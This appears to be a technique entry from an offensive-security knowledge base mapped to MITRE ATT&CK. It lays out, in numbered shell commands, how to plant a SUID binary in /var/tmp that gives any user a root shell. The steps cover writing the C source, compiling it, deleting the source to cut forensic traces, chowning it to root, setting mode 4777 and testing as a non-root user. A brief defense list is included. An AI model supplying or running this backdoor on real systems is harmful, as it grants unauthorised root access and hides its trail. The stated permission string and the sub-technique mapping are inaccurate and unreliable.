---
id: 7d6252d6-e109-462a-9c6d-42718fb182f6
name: Linux-SUID-Binary-Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:17.934014+00:00'
updated_at: '2023-04-10T20:34:16.545366+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
sub_techniques:
  - >-
    [[sub-techniques/Elevated Execution with Prompt|T1548.004 - Elevated
    Execution with Prompt]]
tags:
  - '[[tags/Linux - Persistence]]'
  - '[[tags/Suid Binary]]'
commands:
  - '[[commands/echo-write-c-source]]'
  - '[[commands/gcc-compile-binary]]'
  - '[[commands/rm-remove-source]]'
  - '[[commands/chown-root-ownership]]'
  - '[[commands/chmod-set-suid]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-SUID-Binary-Persistence

## Summary

This procedure creates a SUID binary on a Linux system to establish persistence by allowing any user to execute a root shell. By compiling a simple C program that spawns a root shell and setting the SUID bit, attackers can maintain elevated access even after reboots, evading detection through abuse of elevation mechanisms.

## Description

SUID (Set User ID) binaries on Linux allow a program to run with the privileges of its owner, typically root, regardless of the executing user. This procedure leverages this by creating a custom SUID binary named 'croissant' in /var/tmp that, when executed, drops into a root shell using setresuid to elevate privileges and system to spawn /bin/sh. The binary is compiled from C source, owned by root, and given the SUID permission (4777). This technique is useful for post-exploitation persistence on Unix-like systems where an attacker has temporary root access to set up the backdoor. It maps to MITRE ATT&CK for defense evasion and privilege escalation by abusing system elevation controls. Detection involves monitoring for new SUID binaries in writable directories like /var/tmp.

## Requirements

1. Root privileges on the target Linux system to set ownership and SUID bit.
2. GCC compiler installed (standard on most Linux distributions).
3. Write access to /var/tmp or a similar persistent directory.
4. Basic knowledge of Linux shell and file permissions.

## Defense

- Regularly audit SUID binaries using commands like find / -perm -4000 to detect anomalies.
- Restrict root access and use immutable file attributes on critical binaries.
- Implement file integrity monitoring (e.g., via AIDE or Tripwire) to alert on changes to permissions or new SUID files.
- Enforce principle of least privilege and disable unnecessary SUID binaries system-wide.

## Objectives

1. Compile and deploy a SUID binary that provides root shell access to any user.
2. Ensure the backdoor persists across reboots by placing it in a system directory.
3. Enable stealthy privilege escalation without requiring further authentication.

## Instructions

### Step 1: Set Temporary Directory and Write C Source Code

**Context**: Define a working directory in /var/tmp for persistence and write the C source code that will spawn a root shell using setresuid to elevate and system to execute /bin/sh. This step prepares the payload without immediate execution.

**Command** ([[commands/echo-write-c-source]]):
```bash
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
```

> This command sets the TMPDIR2 variable to /var/tmp and uses echo to create croissant.c with the C code. The code changes the real, effective, and saved user IDs to 0 (root) and spawns an interactive shell. Expected output: No visible output if successful; verify with ls $TMPDIR2/croissant.c showing the file exists.

### Step 2: Compile the C Source into a Binary

**Context**: Compile the C source into an executable binary named 'croissant' to create the SUID payload. Suppress errors during compilation to avoid noise.

**Command** ([[commands/gcc-compile-binary]]):
```bash
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
```

> GCC compiles the source file into the binary. The 2>/dev/null redirects errors (e.g., if warnings occur). Expected output: No output if successful; verify with ls -l $TMPDIR2/croissant showing the executable file.

### Step 3: Remove the Source File for Cleanup

**Context**: Delete the original C source file to reduce forensic footprints and leave only the compiled binary.

**Command** ([[commands/rm-remove-source]]):
```bash
rm $TMPDIR2/croissant.c
```

> RM removes the source file. Expected output: No output; verify with ls $TMPDIR2 showing only croissant remains.

### Step 4: Set Root Ownership on the Binary

**Context**: Change the ownership of the binary to root:root, ensuring it runs with root privileges when the SUID bit is set.

**Command** ([[commands/chown-root-ownership]]):
```bash
chown root:root $TMPDIR2/croissant
```

> Chown sets the owner and group to root. Expected output: No output if successful (requires root); verify with ls -l $TMPDIR2/croissant showing root:root ownership.

### Step 5: Set SUID Bit on the Binary

**Context**: Apply the SUID permission (4777) to allow any user executing the binary to inherit root privileges, enabling persistence.

**Command** ([[commands/chmod-set-suid]]):
```bash
chmod 4777 $TMPDIR2/croissant
```

> Chmod sets permissions: 4 (SUID), 7 (rwx for owner), 7 (rwx for group), 7 (rwx for others). Expected output: No output; verify with ls -l $TMPDIR2/croissant showing -rwsrwsrws (s indicates SUID).

### Step 6: Verify and Test the SUID Binary

**Context**: Test the binary as a non-root user to confirm it drops into a root shell, validating persistence.

**Instructions**: Execute the binary and check the shell's privileges.

```bash
$TMPDIR2/croissant
id
```

> Running croissant should spawn /bin/sh as root (uid=0). The id command confirms root privileges. Expected output: $ id
uid=0(root) gid=0(root) groups=0(root). Exit the shell with Ctrl+D.
